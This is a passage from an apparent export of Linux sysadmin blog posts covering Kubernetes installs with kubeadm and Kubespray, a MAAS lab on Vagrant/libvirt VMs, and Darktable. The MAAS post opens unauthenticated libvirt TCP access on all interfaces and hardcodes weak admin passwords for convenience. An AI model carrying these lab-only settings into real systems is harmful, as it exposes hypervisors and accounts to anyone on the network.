&amp;&amp; apt-get install -y -qq apt-transport-https curl curl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg | apt-key add - tee /etc/apt/sources.list.d/kubernetes.list &lt;&lt; EOF2 deb https://apt.kubernetes.io/ kubernetes-xenial main EOF2 # Install necessary packages: apt-get update -qq apt-get install -y -qq docker.io kubelet=${KUBERNETES_VERSION}-00 kubeadm=${KUBERNETES_VERSION}-00 kubectl=${KUBERNETES_VERSION}-00 # Install Kubernetes Master: kubeadm init --pod-network-cidr=$POD_NETWORK_CIDR --kubernetes-version v${KUBERNETES_VERSION} # Copy the \"kubectl\" config files to the home directory: test -d \"$HOME/.kube\" || mkdir \"$HOME/.kube\" cp -i /etc/kubernetes/admin.conf \"$HOME/.kube/config\" chown -R \"$USER:$USER\" \"$HOME/.kube\" # Install CNI: export KUBECONFIG=/etc/kubernetes/admin.conf kubectl apply -f $CNI_URL # Your Kuberenets Master node should be ready now. You can check it using this command: kubectl get nodes ### Worker nodes installation # Let's connect the worker nodes now # SSH to the worker nodes and repeat these commands on all of them in parallel: ssh root@node2 ssh root@node3 ssh root@node4 # Set the Kubernetes version which will be installed: KUBERNETES_VERSION=\"1.10.0\" # Add the Kubernetes repository (details): apt-get update -qq &amp;&amp; apt-get install -y -qq apt-transport-https curl curl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg | apt-key add - tee /etc/apt/sources.list.d/kubernetes.list &lt;&lt; EOF2 deb https://apt.kubernetes.io/ kubernetes-xenial main EOF2 # Install necessary packages: apt-get update -qq apt-get install -y -qq docker.io kubelet=${KUBERNETES_VERSION}-00 kubeadm=${KUBERNETES_VERSION}-00 kubectl=${KUBERNETES_VERSION}-00 # Exit SSH session on worker nodes and return to local machine # All the worker nodes are prepared now - let's connect them to master node. # SSH to the master node again and generate the \"joining\" command: ssh root@node1 \"kubeadm token create --print-join-command\" # You should see something like: # -&gt; kubeadm join &lt;master-ip&gt;:&lt;master-port&gt; --token &lt;token&gt; --discovery-token-ca-cert-hash sha256:&lt;hash&gt; # Execute the generated command on all worker nodes... ssh -t root@node2 \"kubeadm join --token ... ... ... ... ... ...\" ssh -t root@node3 \"kubeadm join --token ... ... ... ... ... ...\" ssh -t root@node4 \"kubeadm join --token ... ... ... ... ... ...\" # SSH back to the master nodes and check the cluster status - all the nodes should appear there in \"Ready\" status after while. ssh root@node1 # Check nodes kubectl get nodes If you want to do it quickly with creating the VMs in Linux you can use this script: https://github.com/ruzickap/multinode_kubernetes_cluster/blob/master/run-kubeadm.sh It will create 4 VMs using Vagrant (you should have these vagrant plugins installed: vagrant-libvirt + vagrant-hostmanager) and install Kubernetes using kubeadm. Kubespray Kubernetes installation with Kubespray is little bit more complicated. Instead of writing it here I’ll point you to another script which you can use for it’s automation: https://github.com/ruzickap/multinode_kubernetes_cluster/blob/master/run-kubespray.sh It will create 4 VMs using Vagrant (you should have these vagrant plugins installed: vagrant-libvirt + vagrant-hostmanager) and install Kubernetes using kubespray+ansible. Enjoy… :-)" }, { "title": "Create lab infrastructure running Virtual machines with MAAS using Vagrant", "url": "/posts/create-lab-infrastructure-running-virtual-machines-with-maas-using-vagrant/", "categories": "Linux, Virtualization, linux.xvx.cz", "tags": "maas, vagrant, kvm", "date": "2018-02-20 00:00:00 +0100", "content": "Original post from linux.xvx.cz Sometimes it’s handy to replicate the physical environment on a single server to do some testing. In my case I replicated the environment containing 3 VMs where MAAS was installed on the first VM (kvm01) and the other two VMs (kvm02, kvm03) were provisioned by MAAS. I also defined a few networks with IP ranges: deploy_network 192.168.25.0/24, control_network 192.168.26.0/24, tenant_network 192.168.27.0/24. Here is the network diagram of the lab: You can see the commands I used and descriptive video… It’s better to see the video with lab description: Here are the commands I used: # Install Vagrant and virsh command dnf install -y libvirt-client vagrant-hostmanager vagrant-libvirt # Allow to manage VMs via libvirt remotely (using TCP connection) cat &gt;&gt; /etc/libvirt/libvirtd.conf &lt;&lt; EOF listen_tls = 0 listen_tcp = 1 listen_addr = \"0.0.0.0\" auth_tcp = \"none\" EOF echo 'LIBVIRTD_ARGS=\"--listen --config /etc/libvirt/libvirtd.conf\"' &gt;&gt; /etc/sysconfig/libvirtd service libvirtd restart # Generate ssh key used for accessing the VMs ssh-keygen -P \"\" -f /root/.ssh/id_rsa -C \"admin@example.com\" # Check the VMs VIRSH_VMS=$(virsh list | awk '/_kvm/ { print $2 }') for VIRSH_VM in $VIRSH_VMS; do echo \"*** $VIRSH_VM\" virsh dumpxml \"$VIRSH_VM\" | grep 'mac address' | sort done # Check the subnets virsh net-list --all | grep network VIRSH_NETWORKS=$(virsh net-list | awk '/network|vagrant/ { print $1 }') for VIRSH_NETWORK in $VIRSH_NETWORKS; do echo \"*** $VIRSH_NETWORK\" virsh net-dumpxml \"$VIRSH_NETWORK\" done # Create Vagrantfile mkdir /var/tmp/test cat &gt; /var/tmp/test/Vagrantfile &lt;&lt; \\EOF box_image = \"peru/my_ubuntu-16.04-server-amd64\" node_count = 3 ssh_pub_key = File.readlines(\"#{Dir.home}/.ssh/id_rsa.pub\").first.strip Vagrant.configure(2) do |config| config.hostmanager.enabled = true config.hostmanager.manage_host = true config.hostmanager.manage_guest = false config.vm.synced_folder \".\", \"/vagrant\", :disabled =&gt; true config.vm.provider :libvirt do |domain| domain.cpus = 2 domain.cpu_mode = \"host-passthrough\" domain.memory = 1536 domain.machine_virtual_size = 150 domain.disk_bus = \"virtio\" domain.nic_model_type = \"virtio\" domain.video_type = \"qxl\" domain.graphics_type = \"spice\" domain.management_network_address = \"192.168.100.0/24\" end (1..node_count).each do |i| config.vm.define \"kvm0#{i}\" do |config| config.vm.hostname = \"kvm0#{i}\" config.hostmanager.ignore_private_ip = true if i == 1 config.vm.box = box_image config.vm.network :forwarded_port, guest: 80, host: 80, host_ip: \"*\" end config.vm.provider :libvirt do |domain| domain.storage :file, :size =&gt; '100G', :type =&gt; 'qcow2' if i == 1 domain.memory = 4096 else boot_network = {'network' =&gt; 'deploy_network'} domain.boot boot_network #domain.loader = \"/usr/share/edk2/ovmf/OVMF_CODE.fd\" end end config.vm.network :private_network, ip: \"192.168.25.#{i+10}\", auto_config: false, libvirt__network_name: \"deploy_network\", libvirt__dhcp_enabled: false, libvirt__forward_mode: \"nat\", :mac =&gt; \"52:54:00:00:25:#{i+10}\" config.vm.network :private_network, ip: \"192.168.26.#{i+10}\", auto_config: false, libvirt__network_name: \"control_network\", libvirt__dhcp_enabled: false, libvirt__forward_mode: \"nat\", :mac =&gt; \"52:54:00:00:26:#{i+10}\" config.vm.network :private_network, ip: \"192.168.26.#{i+20}\", auto_config: false, libvirt__network_name: \"control_network\", libvirt__dhcp_enabled: false, libvirt__forward_mode: \"nat\", :mac =&gt; \"52:54:00:00:26:#{i+20}\" config.vm.network :private_network, ip: \"192.168.27.#{i+10}\", auto_config: false, libvirt__network_name: \"tenant_network\", libvirt__dhcp_enabled: false, libvirt__forward_mode: \"nat\", :mac =&gt; \"52:54:00:00:27:#{i+10}\" config.vm.network :private_network, ip: \"192.168.27.#{i+20}\", auto_config: false, libvirt__network_name: \"tenant_network\", libvirt__dhcp_enabled: false, libvirt__forward_mode: \"nat\", :mac =&gt; \"52:54:00:00:27:#{i+20}\" end end config.vm.provision 'shell', inline: \"install -m 0700 -d /root/.ssh/; echo #{ssh_pub_key} &gt;&gt; /root/.ssh/authorized_keys; chmod 0600 /root/.ssh/authorized_keys\" config.vm.provision 'shell', inline: \"echo #{ssh_pub_key} &gt;&gt; /home/vagrant/.ssh/authorized_keys\", privileged: false end # Deploy network subnet: 192.168.25.0/24, GW: 192.168.125.1 # Control network subnet: 192.168.26.0/24, GW: 192.168.126.1 # Tenant network subnet: 192.168.27.0/24, GW: 192.168.127.1 EOF cd /var/tmp/test || exit # Start all VMs + create networking vagrant up kvm01 vagrant up # Check the VMs - all should be running VIRSH_VMS=$(virsh list | awk '/_kvm/ { print $2 }') for VIRSH_VM in $VIRSH_VMS; do echo \"*** $VIRSH_VM\" virsh dumpxml \"$VIRSH_VM\" | grep 'mac address' | sort done # Check the subnets virsh net-list --all | grep network VIRSH_NETWORKS=$(virsh net-list | awk '/network|vagrant/ { print $1 }') for VIRSH_NETWORK in $VIRSH_NETWORKS; do echo \"*** $VIRSH_NETWORK\" virsh net-dumpxml \"$VIRSH_NETWORK\" done # Check the DHCP lease file - there should be only kvm01 DEVICE=$(virsh net-dumpxml vagrant-libvirt | awk -F\\' '/bridge/ { print $2 }') cat \"/var/lib/libvirt/dnsmasq/${DEVICE}.status\" # SSH to the first node where MAAS will be installed ssh -o StrictHostKeyChecking=no kvm01 # Check IPs / NICS ip a # Configure the NICs apt update apt install -y ifenslave cat &gt;&gt; /etc/network/interfaces &lt;&lt; EOF auto eth1 iface eth1 inet static address 192.168.25.11 netmask 255.255.255.0 auto eth2 iface eth2 inet manual bond-master bond0 auto eth3 iface eth3 inet manual bond-master bond0 auto bond0 iface bond0 inet static address 192.168.26.11 netmask 255.255.255.0 bond-slaves eth2 eth3 bond_mode active-backup auto eth4 iface eth4 inet manual bond-master bond1 auto eth5 iface eth5 inet manual bond-master bond1 auto bond1 iface bond1 inet static address 192.168.27.11 netmask 255.255.255.0 bond-slaves eth4 eth5 bond_mode active-backup EOF service networking restart # Install MAAS apt install -y jq libvirt-bin maas # Configure Region controller to point to the right MAAS IP address maas-region local_config_set --maas-url http://192.168.25.11:5240/MAAS systemctl restart maas-regiond # Register a rack controller with the MAAS maas-rack register --url http://192.168.25.11:5240/MAAS --secret \"$(cat /var/lib/maas/secret)\" # Create administrator (MAAS \"superuser\") maas createadmin --username=admin --email=admin@example.com --password admin123 # Export API key that was generated when the MAAS account was created maas-region apikey --username=admin &gt; /root/api_key # Create a short script which will help you to login to MAAS quickly cat &gt; /root/maas-login.sh &lt;&lt; \\EOF #!/bin/sh # Change these 3 values as required PROFILE=admin API_KEY_FILE=/root/api_key API_SERVER=localhost MAAS_URL=http://$API_SERVER/MAAS/api/2.0 maas login $PROFILE $MAAS_URL - &lt; $API_KEY_FILE EOF chmod a+x /root/maas-login.sh # Login to MAAS /root/maas-login.sh # Generate SSH key which will be imported in the next command ssh-keygen -P \"\" -f /root/.ssh/id_rsa -C \"admin@example.com\" # Import the admin SSH key maas admin sshkeys create \"key=$(cat /root/.ssh/id_rsa.pub)\" # Turn OFF all VMs except the first one running MAAS # This will also test if the libvirtd daemon is properly configured allowing MAAS to manage the VMs virsh -c qemu+tcp://192.168.25.1/system destroy test_kvm02 virsh -c qemu+tcp://192.168.25.1/system destroy test_kvm03 virsh -c qemu+tcp://192.168.25.1/system list --all SUBNET_CIDR=\"192.168.25.0/24\" SUBNET_PREFIX=$(echo \"$SUBNET_CIDR\" | sed -r 's/(([0-9]{1,3}\\.){2}.[0-9]{1,3}).*/\\1/') PRIMARY_RACK_CONTROLLER=$(maas admin rack-controllers read | jq -r '.[0].system_id') VLAN_FABRIC_ID=$(maas admin subnet read \"$SUBNET_CIDR\" | jq '.vlan.fabric_id') VLAN_VID=$(maas admin subnets read | jq -r \".[] | select(.cidr==\\\"$SUBNET_CIDR\\\")\".vlan.vid) # Add default gateway for 192.168.25.0/24 maas admin subnet update \"cidr:${SUBNET_CIDR}\" \"gateway_ip=${SUBNET_PREFIX}.1\" # Enable DHCP on the subnet 192.168.25.0/24 and reserve dynamic IP range (192.168.25.200 - 192.168.25.250) - used for commissioning maas admin ipranges create type=dynamic \"start_ip=${SUBNET_PREFIX}.200\" \"end_ip=${SUBNET_PREFIX}.250\" comment='This is a reserved dynamic range' maas admin vlan update \"$VLAN_FABRIC_ID\" \"$VLAN_VID\" dhcp_on=True \"primary_rack=$PRIMARY_RACK_CONTROLLER\" # Define node by specifying the libvirt VM management and start commissioning for INDEX in {2..3}; do MAC=\"52:54:00:00:25:1${INDEX}\" maas admin machines create power_parameters_power_address=qemu+tcp://192.168.25.1/system \"hostname=kvm0${INDEX}\" power_type=virsh \"power_parameters_power_id=test_kvm0${INDEX}\" architecture=amd64/generic \"mac_addresses=$MAC\" done # All the machines should be in commissioning state right now virsh -c qemu+tcp://192.168.25.1/system list --all # Set static IPs, create bonds and deploy the Ubuntu Xenial for INDEX in {2..3}; do MAC_1=\"52:54:00:00:25:1${INDEX}\" MAC_2=\"52:54:00:00:26:1${INDEX}\" MAC_3=\"52:54:00:00:26:2${INDEX}\" MAC_4=\"52:54:00:00:27:1${INDEX}\" MAC_5=\"52:54:00:00:27:2${INDEX}\" IP_1=\"192.168.25.1${INDEX}\" SUBNET_CIDR_1=\"192.168.25.0/24\" IP_2=\"192.168.26.1${INDEX}\" SUBNET_CIDR_2=\"192.168.26.0/24\" IP_3=\"192.168.27.1${INDEX}\" SUBNET_CIDR_3=\"192.168.27.0/24\" maas admin nodes read \"mac_address=$MAC_1\" &gt; /tmp/maas_nodes_read SYSTEM_ID=$(jq -r \".[].system_id\" /tmp/maas_nodes_read) INTERFACE_ID_1=$(jq -r \".[].interface_set[] | select(.mac_address==\\\"$MAC_1\\\").id\" /tmp/maas_nodes_read) INTERFACE_ID_2=$(jq -r \".[].interface_set[] | select(.mac_address==\\\"$MAC_2\\\").id\" /tmp/maas_nodes_read) INTERFACE_ID_3=$(jq -r \".[].interface_set[] | select(.mac_address==\\\"$MAC_3\\\").id\" /tmp/maas_nodes_read) INTERFACE_ID_4=$(jq -r \".[].interface_set[] | select(.mac_address==\\\"$MAC_4\\\").id\" /tmp/maas_nodes_read) INTERFACE_ID_5=$(jq -r \".[].interface_set[] | select(.mac_address==\\\"$MAC_5\\\").id\" /tmp/maas_nodes_read) # Remove the \"Auto assign\" IP address and set static instead # https://askubuntu.com/questions/942412/how-do-you-statically-asign-an-ip-to-a-commissioned-machine-in-maas OLD_LINK_ID=$(jq \".[].interface_set[] | select(.id==$INTERFACE_ID_1).links[].id\" /tmp/maas_nodes_read) maas admin interface unlink-subnet \"$SYSTEM_ID\" \"$INTERFACE_ID_1\" \"id=$OLD_LINK_ID\" maas admin interface link-subnet \"$SYSTEM_ID\" \"$INTERFACE_ID_1\" mode=STATIC \"subnet=cidr:$SUBNET_CIDR_1\" \"ip_address=$IP_1\" default_gateway=true # Create bond interfaces maas admin interfaces create-bond \"$SYSTEM_ID\" name=bond0 \"parents=$INTERFACE_ID_2\" \"mac_address=$MAC_2\" \"parents=$INTERFACE_ID_3\" bond_mode=active-backup maas admin interfaces create-bond \"$SYSTEM_ID\" name=bond1 \"parents=$INTERFACE_ID_4\" \"mac_address=$MAC_4\" \"parents=$INTERFACE_ID_5\" bond_mode=active-backup # Regenerate /tmp/maas_nodes_read - now with the bond interfaces maas admin nodes read \"mac_address=$MAC_1\" &gt; /tmp/maas_nodes_read BOND0_ID=$(jq -r \".[].interface_set[] | select(.name==\\\"bond0\\\").id\" /tmp/maas_nodes_read) BOND1_ID=$(jq -r \".[].interface_set[] | select(.name==\\\"bond1\\\").id\" /tmp/maas_nodes_read) # Assign proper fabric and IP to the bond0 FABRIC_VLAN_ID=$(maas admin subnets read | jq \".[] | select(.cidr==\\\"$SUBNET_CIDR_2\\\").vlan.id\") maas admin interface update \"$SYSTEM_ID\" \"$BOND0_ID\" \"vlan=$FABRIC_VLAN_ID\" maas admin interface link-subnet \"$SYSTEM_ID\" \"$BOND0_ID\" mode=STATIC \"subnet=cidr:$SUBNET_CIDR_2\" \"ip_address=$IP_2\" # Assign proper fabric and IP to the bond1 FABRIC_VLAN_ID=$(maas admin subnets read | jq \".[] | select(.cidr==\\\"$SUBNET_CIDR_3\\\").vlan.id\") maas admin interface update \"$SYSTEM_ID\" \"$BOND1_ID\" \"vlan=$FABRIC_VLAN_ID\" maas admin interface link-subnet \"$SYSTEM_ID\" \"$BOND1_ID\" mode=STATIC \"subnet=cidr:$SUBNET_CIDR_3\" \"ip_address=$IP_3\" # Deploy server maas admin machine deploy \"$SYSTEM_ID\" done # All machines should be installed + deployed... virsh -c qemu+tcp://192.168.25.1/system list --all ssh ubuntu@192.168.25.12 -o StrictHostKeyChecking=no ssh ubuntu@192.168.25.13 -o StrictHostKeyChecking=no Asciinema if needed: I hope it’s helpful for somebody… Enjoy ;-)" }, { "title": "How I began with Darktable", "url": "/posts/how-i-began-with-darktable/", "categories": "Photography, linux.xvx.cz", "tags": "photo-editing", "date": "2018-01-20 00:00:00 +0100", "content": "Original post from linux.xvx.cz There are many tools which help you with editing the raw photos, but not so many are free. Because I switched from JPEG to RAW, I was looking for a free editor that could help me with this task…. and I found Darktable. Darktable is used by many professional photographers and starting with it is not very easy. Here are a few steps on how I started to use Darktable. Start watching the tutorials on YouTube to see how others are using Darktable when editing the photos: https://www.youtube.com/results?search_query=darktable Try to learn the techniques used for correcting/improving photos Try to find the photos in your collection similar to the ones which are shown on the video and try to follow similar steps to learn them Practice what you learn from the videos… It’s really handy to see how professional photographers work and then try similar steps on your own photos. There are quite a lot of tutorials on YouTube and one may not know what kind of photo (scene) is actually edited in a particular video. I decided to make a GitHub page, where you can see what kind of photos are edited in specific YouTube Darktable tutorials. It’s handy for finding similar photos in your collection to practice and learn. Here is the link: https://github.com/ruzickap/darktable_video_tutorials_list Enjoy ;-)" }, { "title": "Setup production ready Kubernetes cluster using Kubespray and Vagrant running on the libvirt KVMs", "url": "/posts/setup-production-ready-kubernetes-cluster-using-kubespray-and-vagrant-running-on-the-libvirt-kvms/", "categories": "Kubernetes, Virtualization, linux.xvx.cz", "tags": "kubernetes, kubespray, vagrant, kvm", "date": "2017-11-02 00:00:00 +0100", "content": "Original post from linux.xvx.cz If you are creating some Docker containers - sooner or later you will work with Kubernetes to automate deploying, scaling, and operating application containers. If you need to simply run Kubernetes, there is a project called Minikube which can help you set up a single VM with Kubernetes. This is probably the best way to start with it. Sometimes it’s handy to have “production ready” Kubernetes cluster running on your laptop containing multiple VMs (like in a real production environment) - that’s where you need to look around and search for another solution. After trying a few tools I decided to use Kubespray. It’s a tool for deploying a production ready Kubernetes cluster on AWS, GCE, Azure, OpenStack or Baremetal. I’m fine to create a few virtual machines (using Vagrant) on my laptop and install Kubernetes there. I’ll use 3 VMs, all 3 have etcd installed, all 3 are nodes (running pods), 2 of them run master components. (you can use more VMs with more advanced setup: https://github.com/kubespray/kubespray-cli) Let’s see how you can do it in Fedora 26 using Vagrant + libvirt + Kubespray + Kubespray-cli. Install Vagrant VMs + libvirt and the Vagrantfile template for building the VMs # Install Vagrant libvirt plugin (with all the dependencies like qemu, libvirt, vagrant, ...) dnf install -y -q ansible git libvirt-client libvirt-nss python-netaddr python-virtualenv vagrant-libvirt vagrant plugin install vagrant-libvirt # Enable dns resolution of VMs taken from libvirt (https://lukas.zapletalovi.com/2017/10/definitive-solution-to-libvirt-guest-naming.html) sed -i.orig 's/files dns myhostname/files libvirt libvirt_guest dns myhostname/' /etc/nsswitch.conf # Start the libvirt daemon service libvirtd start # Create ssh key if it doesn't exist test -f ~/.ssh/id_rsa.pub || ssh-keygen -f \"$HOME/.ssh/id_rsa\" -N '' # Create directory structure mkdir /var/tmp/kubernetes_cluster cd /var/tmp/kubernetes_cluster || exit # Create Vagrantfile cat &gt; Vagrantfile &lt;&lt; EOF box_image = \"peru/my_ubuntu-16.04-server-amd64\" node_count = 4 ssh_pub_key = File.readlines(\"#{Dir.home}/.ssh/id_rsa.pub\").first.strip Vagrant.configure(2) do |config| config.vm.synced_folder \".\", \"/vagrant\", :disabled =&gt; true config.vm.box = box_image config.vm.provider :libvirt do |domain| domain.cpus = 2 domain.memory = 2048 domain.default_prefix = '' end (1..node_count).each do |i| config.vm.define \"kube0#{i}\" do |config| config.vm.hostname = \"kube0#{i}\" end end config.vm.provision 'shell', inline: \"install -m 0700 -d /root/.ssh/; echo #{ssh_pub_key} &gt;&gt; /root/.ssh/authorized_keys; chmod 0600 /root/.ssh/authorized_keys\" config.vm.provision 'shell', inline: \"echo #{ssh_pub_key} &gt;&gt; /home/vagrant/.ssh/authorized_keys\", privileged: false end EOF # Create and start virtual machines vagrant up Create Python’s Virtualenv for kubespray and start the Kubernetes cluster provisioning # Create Virtual env for Kubespray and make it active virtualenv --system-site-packages kubespray_virtenv # shellcheck source=/dev/null source kubespray_virtenv/bin/activate # Install Ansible and Kubespray to virtualenv pip install kubespray # Create kubespray config file cat &gt; ~/.kubespray.yml &lt;&lt; EOF kubespray_git_repo: \"https://github.com/kubespray/kubespray.git\" kubespray_path: \"$PWD/kubespray\" loglevel: \"info\" EOF # Prepare kubespray for deployment kubespray prepare --assumeyes --path \"$PWD/kubespray\" --nodes kubernetes_cluster_kube01 kubernetes_cluster_kube02 kubernetes_cluster_kube03 kubernetes_cluster_kube04 cat &gt; kubespray/inventory/inventory.cfg &lt;&lt; EOF [kube-master] kube01 kube02 [all] kube01 kube02 kube03 kube04 [k8s-cluster:children] kube-node kube-master [kube-node] kube01 kube02 kube03 kube04 [etcd] kube01 kube02 kube03 EOF # Set password for kube user test -d kubespray/credentials || mkdir kubespray/credentials echo \"kube123\" &gt; kubespray/credentials/kube_user # Deploy Kubernetes cluster kubespray deploy --assumeyes --user root --apps efk helm netchecker After the deployment is over you should be able to login to one of the master node and run + see something like: root@kube01:~# kubectl get nodes NAME STATUS ROLES AGE VERSION kube01 Ready master,node 7m v1.8.3+coreos.0 kube02 Ready master,node 7m v1.8.3+coreos.0 kube03 Ready node 7m v1.8.3+coreos.0 kube04 Ready node 7m v1.8.3+coreos.0 root@kube01:~# kubectl get componentstatuses NAME STATUS MESSAGE ERROR controller-manager Healthy ok scheduler Healthy ok etcd-0 Healthy {\"health\": \"true\"} etcd-1 Healthy {\"health\": \"true\"} etcd-2 Healthy {\"health\": \"true\"} root@kube01:~# kubectl get daemonSets --all-namespaces NAMESPACE NAME DESIRED CURRENT READY UP-TO-DATE AVAILABLE NODE SELECTOR AGE default netchecker-agent 4 4 4 4 4 &lt;none&gt; 3m default netchecker-agent-hostnet 4 4 4 4 4 &lt;none&gt; 3m kube-system calico-node 4 4 4 4 4 &lt;none&gt; 5m kube-system fluentd-es-v1.22 4 4 4 4 4 &lt;none&gt; 3m root@kube01:~# kubectl get deployments --all-namespaces NAMESPACE NAME DESIRED CURRENT UP-TO-DATE AVAILABLE AGE default netchecker-server 1 1 1 1 3m kube-system elasticsearch-logging-v1 2 2 2 2 3m kube-system kibana-logging 1 1 1 0 3m kube-system kube-dns 2 2 2 2 4m kube-system kubedns-autoscaler 1 1 1 1 4m kube-system kubernetes-dashboard 1 1 1 1 3m kube-system tiller-deploy 1 1 1 1 2m root@kube01:~# kubectl get services --all-namespaces NAMESPACE NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE default kubernetes ClusterIP 10.233.0.1 &lt;none&gt; 443/TCP 7m default netchecker-service NodePort 10.233.52.117 &lt;none&gt; 8081:31081/TCP 3m kube-system elasticsearch-logging ClusterIP 10.233.50.47 &lt;none&gt; 9200/TCP 3m kube-system kibana-logging ClusterIP 10.233.55.77 &lt;none&gt; 5601/TCP 3m kube-system kube-dns ClusterIP 10.233.0.3 &lt;none&gt; 53/UDP,53/TCP 4m kube-system kubernetes-dashboard ClusterIP 10.233.23.217 &lt;none&gt; 80/TCP 3m kube-system tiller-deploy ClusterIP 10.233.2.129 &lt;none&gt; 44134/TCP 2m root@kube01:/home/vagrant# kubectl describe nodes Name: kube01 Roles: master,node Labels: beta.kubernetes.io/arch=amd64 beta.kubernetes.io/os=linux kubernetes.io/hostname=kube01 node-role.kubernetes.io/master=true node-role.kubernetes.io/node=true Annotations: alpha.kubernetes.io/provided-node-ip=192.168.121.170 node.alpha.kubernetes.io/ttl=0 volumes.kubernetes.io/controller-managed-attach-detach=true Taints: &lt;none&gt; CreationTimestamp: Fri, 01 Dec 2017 07:48:12 +0000 Conditions: Type Status LastHeartbeatTime LastTransitionTime Reason Message ---- ------ ----------------- ------------------ ------ ------- OutOfDisk False Fri, 01 Dec 2017 08:00:15 +0000 Fri, 01 Dec 2017 07:48:12 +0000 KubeletHasSufficientDisk kubelet has sufficient disk space available MemoryPressure False Fri, 01 Dec 2017 08:00:15 +0000 Fri, 01 Dec 2017 07:48:12 +0000 KubeletHasSufficientMemory kubelet has sufficient memory available DiskPressure False Fri, 01 Dec 2017 08:00:15 +0000 Fri, 01 Dec 2017 07:48:12 +0000 KubeletHasNoDiskPressure kubelet has no disk pressure Ready True Fri, 01 Dec 2017 08:00:15 +0000 Fri, 01 Dec 2017 07:49:23 +0000 KubeletReady kubelet is posting ready status Addresses: InternalIP: 192.168.121.170 Hostname: kube01 Capacity: cpu: 2 memory: 2048056Ki pods: 110 Allocatable: cpu: 1800m memory: 1445656Ki pods: 110 System Info: Machine ID: b16219f793e6953e4cc3a6375a15800f System UUID: 6CF15F25-6F3A-4AE9-B1DA-417C5F7AEB4B Boot ID: e696a205-9686-42cf-b126-e127e1125e08 Kernel Version: 4.4.0-101-generic OS Image: Ubuntu 16.04.3 LTS Operating System: linux Architecture: amd64 Container Runtime Version: docker://Unknown Kubelet Version: v1.8.3+coreos.0 Kube-Proxy Version: v1.8.3+coreos.0 ExternalID: kube01 Non-terminated Pods: (8 in total) Namespace Name CPU Requests CPU Limits Memory Requests Memory Limits --------- ---- ------------ ---------- --------------- ------------- default netchecker-agent-hostnet-5wzdd 15m (0%) 30m (1%) 64M (4%) 100M (6%) default netchecker-agent-zc2wv 15m (0%) 30m (1%) 64M (4%) 100M (6%) kube-system calico-node-kmfz7 150m (8%) 300m (16%) 64M (4%) 500M (33%) kube-system fluentd-es-v1.22-zsh42 100m (5%) 0 (0%) 200Mi (14%) 200Mi (14%) kube-system kube-apiserver-kube01 100m (5%) 800m (44%) 256M (17%) 2G (135%) kube-system kube-controller-manager-kube01 100m (5%) 250m (13%) 100M (6%) 512M (34%) kube-system kube-proxy-kube01 150m (8%) 500m (27%) 64M (4%) 2G (135%) kube-system kube-scheduler-kube01 80m (4%) 250m (13%) 170M (11%) 512M (34%) Allocated resources: (Total limits may be over 100 percent, i.e., overcommitted.) CPU Requests CPU Limits Memory Requests Memory Limits ------------ ---------- --------------- ------------- 710m (39%) 2160m (120%) 991715200 (66%) 5933715200 (400%) Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal NodeAllocatableEnforced 12m kubelet, kube01 Updated Node Allocatable limit across pods Normal NodeHasSufficientDisk 12m (x8 over 12m) kubelet, kube01 Node kube01 status is now: NodeHasSufficientDisk Normal NodeHasSufficientMemory 12m (x7 over 12m) kubelet, kube01 Node kube01 status is now: NodeHasSufficientMemory Normal NodeHasNoDiskPressure 12m (x8 over 12m) kubelet, kube01 Node kube01 status is now: NodeHasNoDiskPressure Name: kube02 Roles: master,node Labels: beta.kubernetes.io/arch=amd64 beta.kubernetes.io/os=linux kubernetes.io/hostname=kube02 node-role.kubernetes.io/master=true node-role.kubernetes.io/node=true Annotations: alpha.kubernetes.io/provided-node-ip=192.168.121.99 node.alpha.kubernetes.io/ttl=0 volumes.kubernetes.io/controller-managed-attach-detach=true Taints: &lt;none&gt; CreationTimestamp: Fri, 01 Dec 2017 07:48:18 +0000 Conditions: Type Status LastHeartbeatTime LastTransitionTime Reason Message ---- ------ ----------------- ------------------ ------ ------- OutOfDisk False Fri, 01 Dec 2017 08:00:11 +0000 Fri, 01 Dec 2017 07:48:18 +0000 KubeletHasSufficientDisk kubelet has sufficient disk space available MemoryPressure False Fri, 01 Dec 2017 08:00:11 +0000 Fri, 01 Dec 2017 07:48:18 +0000 KubeletHasSufficientMemory kubelet has sufficient memory available DiskPressure False Fri, 01 Dec 2017 08:00:11 +0000 Fri, 01 Dec 2017 07:48:18 +0000 KubeletHasNoDiskPressure kubelet has no disk pressure Ready True Fri, 01 Dec 2017 08:00:11 +0000 Fri, 01 Dec 2017 07:49:19 +0000 KubeletReady kubelet is posting ready status Addresses: InternalIP: 192.168.121.99 Hostname: kube02 Capacity: cpu: 2 memory: 2048056Ki pods: 110 Allocatable: cpu: 1800m memory: 1445656Ki pods: 110 System Info: Machine ID: b16219f793e6953e4cc3a6375a15800f System UUID: 1D8EF759-33F1-42B0-9F47-49877BCD971A Boot ID: c5de3f75-d7c6-4c01-8c98-24dad24e6e8a Kernel Version: 4.4.0-101-generic OS Image: Ubuntu 16.04.3 LTS Operating System: linux Architecture: amd64 Container Runtime Version: docker://Unknown Kubelet Version: v1.8.3+coreos.0 Kube-Proxy Version: v1.8.3+coreos.0 ExternalID: kube02 Non-terminated Pods: (8 in total) Namespace Name CPU Requests CPU Limits Memory Requests Memory Limits --------- ---- ------------ ---------- --------------- ------------- default netchecker-agent-hostnet-5ff9f 15m (0%) 30m (1%) 64M (4%) 100M (6%) default netchecker-agent-mdgnj 15m (0%) 30m (1%) 64M (4%) 100M (6%) kube-system calico-node-rh9pp 150m (8%) 300m (16%) 64M (4%) 500M (33%) kube-system fluentd-es-v1.22-d7j4w 100m (5%) 0 (0%) 200Mi (14%) 200Mi (14%) kube-system kube-apiserver-kube02 100m (5%) 800m (44%) 256M (17%) 2G (135%) kube-system kube-controller-manager-kube02 100m (5%) 250m (13%) 100M (6%) 512M (34%) kube-system kube-proxy-kube02 150m (8%) 500m (27%) 64M (4%) 2G (135%) kube-system kube-scheduler-kube02 80m (4%) 250m (13%) 170M (11%) 512M (34%) Allocated resources: (Total limits may be over 100 percent, i.e., overcommitted.) CPU Requests CPU Limits Memory Requests Memory Limits ------------ ---------- --------------- ------------- 710m (39%) 2160m (120%) 991715200 (66%) 5933715200 (400%) Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal Starting 12m kubelet, kube02 Starting kubelet. Normal NodeAllocatableEnforced 12m kubelet, kube02 Updated Node Allocatable limit across pods Normal NodeHasSufficientDisk 12m (x8 over 12m) kubelet, kube02 Node kube02 status is now: NodeHasSufficientDisk Normal NodeHasSufficientMemory 12m (x8 over 12m) 